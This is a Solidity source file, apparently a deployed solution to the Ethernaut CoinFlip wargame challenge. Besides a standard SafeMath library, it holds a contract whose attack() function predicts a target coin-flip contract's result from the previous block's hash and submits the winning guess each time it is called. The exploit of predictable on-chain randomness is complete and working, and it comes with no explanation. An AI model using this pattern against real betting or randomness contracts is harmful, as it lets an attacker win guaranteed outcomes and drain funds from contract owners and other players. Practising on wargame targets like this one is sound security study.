/**
 *Submitted for verification at Etherscan.io on 2022-08-25
*/

pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface CoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool _guess) external returns (bool);
}

contract EnterCoinFlip {
    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address target;

    constructor(address _target) public {
        target = _target;
    }

    function flip(bool _guess) private returns (bool) {
        return CoinFlip(target).flip({ _guess: _guess });
    }

    function predictNext() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
 
    function attack() external returns (bool) {
        bool side = predictNext();
        return flip(side);
    }
}